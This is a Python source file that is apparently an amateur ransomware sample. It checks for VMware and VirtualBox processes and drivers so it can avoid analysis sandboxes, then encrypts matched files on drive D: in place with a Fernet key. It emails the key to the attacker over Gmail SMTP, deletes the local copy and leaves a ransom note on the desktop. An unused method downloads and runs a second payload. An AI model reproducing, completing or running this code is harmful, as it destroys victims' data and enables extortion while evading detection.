import os
from cryptography.fernet import Fernet
import files_to_encrypt
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import requests
import subprocess
import psutil


class Scan_drive():

    def __init__(self, path):
        self.path = path
        # path = 'D:/'
        # r=root, d=directories, f = files

    def evasion(self):
        if os.name != "nt":
            exit()
        process1 = "vmsrvc.exe"
        process2 = "vmusrvc.exe"
        process3 = "vboxtray.exe"
        process4 = "vmtoolsd.exe"
        process5 = "df5serv.exe"
        process6 = "vboxservice.exe"
        for proc in psutil.process_iter():
            try:
                if proc.name().lower() == process1.lower() or proc.name().lower() == process2.lower() or proc.name().lower() == process3.lower() or proc.name().lower() == process4.lower() or proc.name().lower() == process5.lower() or proc.name().lower() == process6.lower():
                    exit()
            except WindowsError:
                vmpath1 = os.path.exists("C:\windows\system32\drivers\\vmci.sys")
                vmpath2 = os.path.exists("C:\windows\system32\drivers\\vmhgfs.sys")
                vmpath3 = os.path.exists("C:\windows\system32\drivers\\vmmouse.sys")
                vmpath4 = os.path.exists("C:\windows\system32\drivers\\vmscsi.sys")
                vmpath5 = os.path.exists("C:\windows\system32\drivers\\vmusemouse.sys")
                vmpath6 = os.path.exists("C:\windows\system32\drivers\\vmx_svga.sys")
                vmpath7 = os.path.exists("C:\windows\system32\drivers\\vmxnet.sys")
                vmpath8 = os.path.exists("C:\windows\system32\drivers\\VBoxMouse.sys")
                if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                    exit()

    def walk_drive(self):
        files = []
        try:
            for r, d, f in os.walk(self.path):
                for file in f:
                    for ext in files_to_encrypt.files_to_encrypt:
                        if ext in file:
                            files.append(os.path.join(r, file))
                        else:
                            pass
        except OSError as err:
            sys.exit()
        finally:
            print("File I encrypted: \n", files)
        return files

    def specific_encrypt(self):
        try:
            key = Fernet.generate_key()
            with open("key.bull", "wb") as key_file:
                key_file.write(key)
        except OSError as err:
            sys.exit()
        try:
            for filename in Scan_drive.walk_drive(self):
                f = Fernet(key)
                with open(filename, "rb") as enc_file:
                    # read all file data
                    enc_file_data = enc_file.read()
                # encrypt data
                encrypted_data = f.encrypt(enc_file_data)
                # write the encrypted file
                with open(filename, "wb") as enc_file2:
                    enc_file2.write(encrypted_data)
        except OSError:
            pass

    def mail(self):
        fromaddr = "EMAIL address of the sender"
        toaddr = "EMAIL address of the receiver"

        # instance of MIMEMultipart
        msg = MIMEMultipart()

        # storing the senders email address
        msg['From'] = fromaddr

        # storing the receivers email address
        msg['To'] = toaddr

        # storing the subject
        msg['Subject'] = "Subject of the Mail"

        # string to store the body of the mail
        body = "Body_of_the_mail"

        # attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # open the file to be sent
        filename = "File_name_with_extension"
        attachment = open("key.bull", "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form
        p.set_payload((attachment).read())

        # encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'
        msg.attach(p)

        # creates SMTP session
        s = smtplib.SMTP('smtp.gmail.com', 587)

        # start TLS for security
        s.starttls()

        # Authentication
        s.login(fromaddr, "Password_of_the_sender")

        # Converts the Multipart msg into a string
        text = msg.as_string()

        # sending the mail
        s.sendmail(fromaddr, toaddr, text)

        # terminating the session
        s.quit()

    def delete_file(self):
        try:
            os.remove("key.bull")
        except OSError as err:
            name = "key.bull"
            path = self.path
            for root, dirs, files in os.walk(path):
                if name in files:
                    os.remove(os.path.join(root, name))

    def user_messege(self):
        with open("C:\Users\john\Desktop\Decrypt_message.txt", "w") as f:
            message = "Contact me Baby"
            f.write(message)
        f.close()

    def payment_server(self):
        url = "index.html"
        r = requests.get(url)
        with open("secondary_payload.py", "wb") as code:
            code.write(r.content)
        subprocess.Popen(code, shell=False)


test = Scan_drive('D:/')
test.evasion()
test.walk_drive()
test.specific_encrypt()
test.mail()
test.delete_file()
test.user_messege()
